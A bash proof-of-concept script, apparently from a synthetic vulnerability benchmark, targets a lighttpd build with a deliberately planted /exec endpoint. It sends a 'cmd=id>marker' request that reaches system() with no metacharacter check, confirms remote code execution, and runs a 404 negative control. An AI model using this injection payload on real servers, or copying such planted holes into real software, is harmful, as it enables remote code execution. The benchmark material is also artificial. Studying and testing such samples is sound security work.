#!/usr/bin/env bash
# PoC for 167_lighttpd_C2I3S3
# Axes: C2 (config file gate) / I3 (struct dispatch) / S3 (strict_exec gated, bypass: not set)
#
# Gate: exec_mode and exec_logging read from --exec-config file.
# S3: strict_exec is a static int defaulting to 0 — never activated by config file
#     in this sample, so metacharacter check is never reached. Exploit with any chars.
# I3: cmd flows via exec_args_t struct to dispatch_exec() -> system().
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lighttpd"
WWWROOT="/tmp/poc_167_www"
MARKER="/tmp/poc_167_marker"
PORT=18167
NEG_PORT=19167
CONF="/tmp/poc_167.conf"
EXEC_CONF="/tmp/poc_167_exec.conf"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" "$EXEC_CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

cat > "$CONF" <<CONFEOF
server.port = $PORT
server.document-root = "$WWWROOT"
server.http-parseopts = ("url-normalize" => "disable")
CONFEOF

# exec config enables endpoint; strict_exec stays 0 (S3 bypass by omission)
cat > "$EXEC_CONF" <<CONFEOF
exec_mode = 1
exec_logging = 1
CONFEOF

echo "[*] starting lighttpd with --exec-config on port $PORT..."
"$BINARY" -f "$CONF" -D --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 0.4

# S3 bypass: strict_exec is 0 by default, so metachar check never runs
echo "[*] sending payload (S3 bypass — strict_exec=0): cmd=id>${MARKER}"
python3 -c "
import socket, time
s = socket.socket()
s.connect(('127.0.0.1', $PORT))
req = ('GET /exec?cmd=id>${MARKER} HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n').encode()
s.sendall(req)
time.sleep(0.3)
s.recv(4096)
s.close()
"
sleep 0.3

if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# Negative control
echo "[*] verifying gate: endpoint must return 404 without --exec-config..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null; SERVER_PID=0

NEG_CONF="/tmp/poc_167_neg.conf"
cat > "$NEG_CONF" <<CONFEOF
server.port = $NEG_PORT
server.document-root = "$WWWROOT"
server.http-parseopts = ("url-normalize" => "disable")
CONFEOF

"$BINARY" -f "$NEG_CONF" -D &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(python3 -c "
import socket
s = socket.socket()
s.connect(('127.0.0.1', $NEG_PORT))
s.sendall(b'GET /exec?cmd=id HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n')
resp = s.recv(4096).decode('utf-8', errors='replace')
s.close()
code = resp.split()[1] if len(resp.split()) > 1 else 'UNKNOWN'
print(code)
" 2>/dev/null || echo "UNKNOWN")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null
rm -f "$NEG_CONF"

if [[ "$HTTP_CODE" == "404" || "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got $HTTP_CODE without --exec-config"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404/403)"
fi
